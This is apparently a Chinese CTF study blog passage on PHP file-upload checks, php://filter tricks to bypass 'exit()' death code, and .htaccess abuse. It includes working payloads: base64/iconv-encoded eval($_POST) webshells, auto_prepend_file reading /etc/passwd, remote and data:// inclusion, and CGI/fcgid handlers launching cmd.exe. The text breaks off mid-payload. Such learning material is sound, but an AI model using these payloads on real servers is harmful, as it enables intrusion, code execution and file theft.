由于线程安全问题，自 PHP <span class="hljs-number">5.3</span><span class="hljs-number">.0</span> 禁用。<br>FILEINFO_DEVICES (<span class="hljs-type">integer</span>)<br>查看设备的块内容或字符。<br>FILEINFO_CONTINUE (<span class="hljs-type">integer</span>)<br>返回全部匹配的类型。<br>FILEINFO_PRESERVE_ATIME (<span class="hljs-type">integer</span>)<br>如果可以的话，尽可能保持原始的访问时间。<br>FILEINFO_RAW (<span class="hljs-type">integer</span>)<br>对于不可打印字符不转换成 \ooo 八进制表示格式。<br>FILEINFO_EXTENSION (<span class="hljs-type">integer</span>)<br>根据 MIME 类型返回适当的文件扩展名。 有的文件类型具有多种扩展名，例如 JPEG 将会返回多个扩展名， 以斜杠分隔，比如 <span class="hljs-string">&quot;jpeg/jpg/jpe/jfif&quot;</span>。 如果在 magic.mime 数据库里类型未知，则返回的是 <span class="hljs-string">&quot;???&quot;</span>。 PHP <span class="hljs-number">7.2</span><span class="hljs-number">.0</span> 起有效。<br><br></code></pre></td></tr></table></figure><p><code>finfo_file()</code>返回<code>finfo_open</code>设置的参数对应的信息</p><h3 id="Getimagesize（检测文件头，读取文件的前八位的十六进制）"><a href="#Getimagesize（检测文件头，读取文件的前八位的十六进制）" class="headerlink" title="Getimagesize（检测文件头，读取文件的前八位的十六进制）"></a>Getimagesize（检测文件头，读取文件的前八位的十六进制）</h3><p>返回文件大小和文件类型</p><p>上传只有第一行文件头的图片</p><p>finfo_open识别为了png图片，但是getimagesize函数并没有识别成功  （给新生上强度）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220715920.png" alt="image-20230901220715920"></p><p>往图片第二行随便加东西</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220818065.png" alt="image-20230901220818065"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901220943156.png" alt="image-20230901220943156"></p><p>成功识别</p><h3 id="exif-imagetype-（GIF89a应该是用来饶过他的）"><a href="#exif-imagetype-（GIF89a应该是用来饶过他的）" class="headerlink" title="exif_imagetype   （GIF89a应该是用来饶过他的）"></a>exif_imagetype   （GIF89a应该是用来饶过他的）</h3><p>只是返回数字（数组中的索引）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">1IMAGETYPE<span class="hljs-emphasis">_GIF</span><br><span class="hljs-emphasis">2IMAGETYPE_JPEG</span><br><span class="hljs-emphasis">3IMAGETYPE_PNG</span><br><span class="hljs-emphasis">4IMAGETYPE_SWF</span><br><span class="hljs-emphasis">5IMAGETYPE_PSD</span><br><span class="hljs-emphasis">6IMAGETYPE_BMP</span><br><span class="hljs-emphasis">7IMAGETYPE_TIFF_II（Intel 字节顺序）</span><br><span class="hljs-emphasis">8IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><br><span class="hljs-emphasis">9IMAGETYPE_JPC</span><br><span class="hljs-emphasis">10IMAGETYPE_JP2</span><br><span class="hljs-emphasis">11IMAGETYPE_JPX</span><br><span class="hljs-emphasis">12IMAGETYPE_JB2</span><br><span class="hljs-emphasis">13IMAGETYPE_SWC</span><br><span class="hljs-emphasis">14IMAGETYPE_IFF</span><br><span class="hljs-emphasis">15IMAGETYPE_WBMP</span><br><span class="hljs-emphasis">16IMAGETYPE_</span>XBM<br></code></pre></td></tr></table></figure><h2 id="死亡代码"><a href="#死亡代码" class="headerlink" title="死亡代码"></a>死亡代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>建议看看Boogipop大佬的文章，讲的很好</p><p>常规的我就不写了，写一下我没见过的</p><h4 id="php7先压缩再解压（测试有问题）"><a href="#php7先压缩再解压（测试有问题）" class="headerlink" title="php7先压缩再解压（测试有问题）"></a>php7先压缩再解压（测试有问题）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>大佬的示例</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065000143.png" alt="image-20230902065000143"></p><p>我的示例（php7.3.4和7.1.9都不行）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065554692.png" alt="image-20230902065554692"></p><p>呜呜，又与大佬不一样了</p><h3 id="死亡代码变种"><a href="#死亡代码变种" class="headerlink" title="死亡代码变种"></a>死亡代码变种</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#插入无关代码在filename处正常解析</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php<br><br><span class="hljs-comment">#当文件名</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure><p>和大佬说的一样，使用上述两个代码都只能创建文件，无法生成内容</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>写入的内容拼接起来是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>都知道<code>=</code>在base64中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的</p><p>即<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>作为<code>=</code>后的内容，会被忽略或使解码失败</p><h4 id="解决办法（1）"><a href="#解决办法（1）" class="headerlink" title="解决办法（1）"></a>解决办法（1）</h4><p>嵌套过滤器    string.strip.tags|convert.base64-decode</p><p>初代payload：<code> php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>只能说实在是妙啊</p><p>创建<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>文件，内容拼接起来是<code>&lt;?php exit();php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>先去除标签，就只剩下<code>PD9waHAgcGhwaW5mbygpOz8%2B.php</code>然后再进行<code>base64-decode</code></p><p>实操发现会报错。。。。。</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902073626707.png" alt="image-20230902073626707"></p><p>我在想是不是要先创建文件，当创建文件时，我悟了，windows的文件命名不能有<code>?&gt;</code>等字符，只能在<code>linux</code>环境中尝试（难怪大佬的图使用linux），既然如此，我也复现不了了，没有环境，还不会docker启环境</p><p>然后就能生成文件，但在访问的时候，大佬发现文件名有问题，会出现访问不到的情况，原因是引号</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902074746052.png" alt="image-20230902074746052"></p><p>我们看到生成的文件是带有引号的，正常的文件是不带有的</p><p>大佬这里使用伪目录的方法</p><p>最终payload:<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>作为内容时，剩下的<code>PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>仍可以被解析</p><p>作为文件名时，<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B</code>被当作一个目录（虽然不存在），然后<code>../</code>又回到了本来的目录，于是生成<code>s1mple.php</code></p><p>我把过滤器去掉尝试后发现确实可以生成<code>s1mple.php</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902075804794.png" alt="image-20230902075804794"></p><h4 id="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"><a href="#大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）" class="headerlink" title="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"></a>大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）</h4><p>payload:<code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>博客的说法</p><p>他的意思是代码粘起来：<code>&lt;?php exit();php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>之后<br>strip_tags去除内容后为：<code>&lt;?php exit();PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>（我的错误理解是留下<code>&lt;?php exit();php://filter/PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>）</p><p>。。。好像错的更加彻底</p><p><strong>真实情况</strong>（也是Boogipop大佬的理解）</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=a.php&#x27;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;a.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拼接后是<code>&lt;?php exit()&lt;?;?&gt;PD9waHAgcGhwaW5mbygpOz8+</code></p><p>真实情况，只剩base64代码，然后base64解密</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902085745201.png" alt="image-20230902085745201"></p><p>所以<code>string.strip_tags</code>不是只会去除<code>&lt;?;?&gt;</code>中间的内容，那是错误的观念</p><h4 id="解决办法（2）rot13-（windows本地测试不通过）"><a href="#解决办法（2）rot13-（windows本地测试不通过）" class="headerlink" title="解决办法（2）rot13    （windows本地测试不通过）"></a>解决办法（2）rot13    （windows本地测试不通过）</h4><p>这个就方便多了，不会受到<code>=</code>的限制</p><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code></p><p>测试情况</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903103600057.png" alt="image-20230903103600057"></p><p>生气，不管是正常的死亡代码还是这个变种，<code>rot13</code>都会报这个错误</p><h4 id="解决办法（3）-convert-iconv"><a href="#解决办法（3）-convert-iconv" class="headerlink" title="解决办法（3） convert.iconv"></a>解决办法（3） convert.iconv</h4><p>iconv拥有很多字符编码，利用convert.iconv 进行字符编码转化，这个涉及到filterchain的构造，内容挺多，这就只讲Boogipop大佬提及的</p><h5 id="usc-2"><a href="#usc-2" class="headerlink" title="usc-2"></a>usc-2</h5><p>每两个字符进行翻转   （一定要是偶数、否则报错）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111013076.png" alt="image-20230903111013076"></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;</code></p><h5 id="usc-4"><a href="#usc-4" class="headerlink" title="usc-4"></a>usc-4</h5><p>就是4位一反转   (同理，需要4的倍数)</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111239338.png" alt="image-20230903111239338"></p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><h5 id="utf-8到utf-7的转化"><a href="#utf-8到utf-7的转化" class="headerlink" title="utf-8到utf-7的转化"></a>utf-8到utf-7的转化</h5><p><code>=</code>会被转化为<code>+AD0-</code>     （<code>filterchain</code>构造需要）</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=a.php</code></p><p><code>windows</code>没有<code>iconv</code>，但是我是能成功写入内容的（不太理解）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112719444.png" alt="image-20230903112719444"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112735404.png" alt="image-20230903112735404"></p><h3 id="死亡代码变种（二）"><a href="#死亡代码变种（二）" class="headerlink" title="死亡代码变种（二）"></a>死亡代码变种（二）</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents($<span class="hljs-params">filename</span>, $<span class="hljs-params">content</span> . <span class="hljs-string">&quot;\nxxxxxx&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>因为<code>php</code>有特殊的起始符和结束符，所以出题时一般会被禁用php</p><p>常见考点是利用<code>.htaccess</code>，<code>.htaccess</code>文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用<strong>注释符</strong>将杂糅的代码进行注释，然后才可以正常访问；</p><p>对于换行符我们直接进行 <code>\</code> 注释（应该是转义的意思），<code>#</code>注释杂糅的内容</p><p>`#&#96;一般放在行首，并且只能注释一行</p><p><code>php_value%20auto_prepend_file%20文件地址%0a%23\</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903114418114.png" alt="image-20230903114418114"></p><p>Boogipop大佬参考的文章的作者的其他方法</p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html</a></p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html</a></p><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess 中有 <code>#</code> 单行注释符, 且支持 <code>\</code>拼接上下两行。</p><p>子目录中的<code>.htaccess</code>指令会覆盖父目录或者主配置文件中的<code>.htaccess</code>指令</p><p>apache2.conf   <code>AllowOverride All #启动.htaccess文件的使用</code><br>也可以将 .htaccess 修改为其他名<code>AccessFileName .config #将.htaccess修改为.config</code></p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p><code>SetHandler application/x-httpd-php</code><br>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析（上传jpg文件但内容为一句话木马，也会被成功解析）<br><code>SetHandler server-status</code><br>这是查看apache的服务器信息的</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903115244293.png" alt="image-20230903115244293"></p><h3 id="AddHandler-AddType"><a href="#AddHandler-AddType" class="headerlink" title="AddHandler,AddType"></a>AddHandler,AddType</h3><blockquote><p>AddType application&#x2F;x-httpd-php .htm<br>#.htm后缀的文件视为php文件执行</p><p>AddHandler cgi-script .aaa<br>#后缀名为.aaa的文件视为cgi脚本执行</p><p>AddType application&#x2F;x-httpd-php png jpg gif<br>#将png，jpg，gif后缀名都视为php执行</p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当使用<code>PHP</code>作为<code>Apache</code>模块时，也可以用<code>Apache</code>的配置文件（例如 httpd.conf）和 <code>.htaccess </code>文件中的指令来修改 php 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All </code>权限才可以。</p><p><code>.htaccess</code>只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR </code>类型的指令。</p><ol><li>auto_prepend_file：在主文件解析之前自动解析包含的文件</li><li>auto_append_file：在主文件解析后自动解析包含的文件</li></ol><p>如：<code>php_value auto_prepend_file 1.jpg</code> #每次访问一个<code>php</code>文件，都会先解析1.jpg图片，如果里面有代码就会执行</p><h3 id="php-flag-（控制开关）"><a href="#php-flag-（控制开关）" class="headerlink" title="php_flag   （控制开关）"></a>php_flag   （控制开关）</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903120640554.png" alt="image-20230903120640554"></p><p>将其中的engine设为0可以关闭php解析从而达到源码泄露的目的 </p><p>（这里源码泄露的意思是）因为像<code>&lt;?php phpinfo();?&gt;</code>这样的php代码一般会被解析而无法显现，这里关闭解析，于是代码就会显示</p><p>如：<code>php_flag engine off</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>#</code>一般放在行首，并且只能注释一行</p><h4 id="多行注释-0a"><a href="#多行注释-0a" class="headerlink" title="多行注释         #%0a"></a>多行注释         #%0a</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_fi\<br>le <span class="hljs-number">1.</span>png<br># <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> 注释<br></code></pre></td></tr></table></figure><p>里面的<code>\</code>并不只是单单的<code>\</code>，他实际上是<code>\%0a、</code>，转义了换行符</p><p>利用这种技巧用<code>#\%0a</code>来多行注释</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 将test.gif 当做 PHP 执行   </span><br><span class="hljs-section">&lt;FilesMatch  <span class="hljs-string">&quot;test.gif&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span>  application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .png 当做 PHP 文件解析</span><br>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png<br></code></pre></td></tr></table></figure><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><code>php_value auto_prepend_file /etc/passwd</code></p><p>访问<code>php</code>文件时会先打开<code>/etc/passwd</code>   (<code>/etc/passwd</code>的内容在php文件内容前)</p><p><code>auto_append_file</code>同理 （内容在php文件内容之后）</p><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>PHP 的<code>all_url_include</code>配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为<code>all_url_include</code>的配置范围为<code> PHP_INI_SYSTEM</code>,所以无法利用<code>php_flag</code>在<code>.htaccess</code>中开启</p><p><code>php_value auto_append_file http://10.87.9.156/phpinfo.txt</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122210912.png" alt="image-20230903122210912"></p><p>太神奇了</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p><code>php_flag engine 0</code></p><p>在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122346792.png" alt="image-20230903122346792"></p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>条件：<code>all_url_fopen=on</code>,<code>all_url_include=on</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_append_file data:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></code></pre></td></tr></table></figure><h4 id="解析-htaccess"><a href="#解析-htaccess" class="headerlink" title="解析.htaccess"></a>解析.htaccess</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><code>&lt;?php phpinfo();?&gt;</code>会被解析</p><p>这种方法在我们随便打开一个PHP文件后就会去解析.htaccess文件（这里的htaccess文件一定要和php文件在一个目录下！！！！）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122707190.png" alt="image-20230903122707190"></p><p>二</p><p>这种适合同目录或子目录没有<code>php</code>文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span></span><br><span class="language-xml"> Require all granted</span><br><span class="language-xml"> Order allow,deny</span><br><span class="language-xml"> Allow from all</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><br><span class="language-xml">SetHandler application/x-httpd-php</span><br><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>上面的代码必须加，是允许访问htaccess文件</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h5><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> cgi_module modules/mod_cgi.so<br></code></pre></td></tr></table></figure><p>.htaccess内容</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options ExecCGI <span class="hljs-comment">#允许CGI执行</span><br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx <span class="hljs-comment">#将xx后缀名的文件，当做CGI程序进行解析</span><br></code></pre></td></tr></table></figure><p>ce.xx</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /k start calc.exe</span><br><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903123655129.png" alt="image-20230903123655129"></p><h5 id="fastcgi-（百闻不如一见）"><a href="#fastcgi-（百闻不如一见）" class="headerlink" title="fastcgi     （百闻不如一见）"></a>fastcgi     （百闻不如一见）</h5><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> fcgid_module modules/mod_fcgid.so<br></code></pre></td></tr></table></figure><p>.htaccess</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler fcgid-script <span class="hljs-string">.xx</span><br>FcgidWrapper <span class="hljs-string">&quot;C:/Windows/System32/cmd.exe /k start calc.exe&quot;</span> <span class="hljs-string">.xx</span><br></code></pre></td></tr></table></figure><p>ce.xx 内容随意  （所以叫fast）</p><h4 id="自定义错误文件-（不太理解）"><a href="#自定义错误文件-（不太理解）" class="headerlink" title="自定义错误文件   （不太理解）"></a>自定义错误文件   （不太理解）</h4><p><code>error.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-comment">#报错页面</span><br></code></pre></td></tr></table></figure><p><code>.htaccess</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/tmp/</span>www<span class="hljs-regexp">/html/</span>shell.php <br>php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903124241964.png" alt="image-20230903124241964"></p><p>会经过 html 编码，所以需要 UTF-7 来绕过。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 第一次</span><br>php_value error_log <span class="hljs-keyword">/tmp/</span>shell <span class="hljs-meta">#定义错误路径</span><br><span class="hljs-meta">#---- <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span> in UTF-7:</span><br>php_value include_path <span class="hljs-string">&quot;+ADw?php phpinfo()+ADs 